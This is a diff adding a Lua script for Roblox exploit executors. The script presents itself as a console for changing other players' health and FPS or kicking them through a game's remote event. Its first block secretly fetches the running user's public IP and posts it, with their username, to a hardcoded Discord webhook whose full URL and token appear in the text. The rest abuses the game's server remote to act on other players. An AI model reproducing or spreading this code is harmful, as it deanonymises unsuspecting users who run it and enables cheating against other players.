@@ -1,0 +1,132 @@
+local webh = "https://discord.com/api/webhooks/1032860998421450843/y8_uFSu7aQSGhQYtu0C8TVRv4gEf4Q-h2tO1fbfdh4-G_wQyfA4N-AkX6Bskke6svv42"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+wait(1)
+
+local prefix = ':'
+
+local cmds = {'health', 'kick', 'setfps', 'clear'}
+local players = game.Players
+local remote = game.ReplicatedStorage:WaitForChild('TermSettings')
+
+getPlayer = function(str)
+    if str == 'me' then return players.LocalPlayer end
+    
+    for _, Player in ipairs(players:GetPlayers()) do
+        if (string.lower(str) == string.sub(string.lower(Player.Name), 1, #str)) then
+            return Player;
+        end
+    end
+    return nil
+end
+
+cprint = function(text, color)
+    color = '@@'..color:upper()..'@@'
+    rconsoleprint(color)
+    rconsoleprint(text..'\n')
+end
+
+printinfo = function()
+    cprint('AVAILABLE COMMANDS:', 'red')
+    cprint('    [=] '..prefix..'health player #', 'light_red')
+    cprint('        [*] Changes players health', 'light_gray')
+    cprint('    [=] '..prefix..'kick player reason', 'light_red')
+    cprint('        [*] Kicks a player for a reason', 'light_gray')
+    cprint('    [=] '..prefix..'setfps player #', 'light_red')
+    cprint('        [*] Changes players fps', 'light_gray')
+    cprint('    [=] '..prefix..'clear', 'light_red')
+    cprint('        [*] Clears console', 'light_gray')
+    cprint('======================================================================================', 'light_magenta')
+end
+printinfo()
+
+parseInput = function(str)
+    if not str:sub(1,1) == prefix then return false end
+
+    str = str:lower():sub(2):split(' ')
+    if #str > 3 and str[1] ~= 'kick' then cprint('Too many arguments.', 'yellow'); return false end
+
+    if table.find(cmds, str[1]) then
+        if str[1] == 'clear' then rconsoleclear(); printinfo(); return false end
+        if not getPlayer(str[2]) then cprint('Player not found.', 'yellow'); return false end
+
+        if str[1] ~= 'kick' then
+            if not tonumber(str[3]) then
+                cprint('Invalid argument.', 'yellow')
+                return false
+            end
+        else
+            local s = ''
+            for i=3, #str do
+                s = s..' '..str[i]
+            end
+            
+            return str[1], getPlayer(str[2]), s
+        end
+        
+        return str[1], getPlayer(str[2]), str[3]
+    end
+    cprint('Unrecognized command.', 'yellow')
+    return false
+end
+
+local input = nil;
+while true do
+    task.wait()
+    if not input then
+        rconsoleprint('@@WHITE@@')
+        input = rconsoleinput()
+    else
+        if not parseInput(input) then input = nil; continue end
+
+        local command, player, args = parseInput(input)
+        remote:FireServer(command, player, args)
+        cprint('SUCCESSFULLY RAN COMMAND | '..prefix..command..' '..player.Name..' '..args, 'light_green')
+        input = nil
+    end
+end
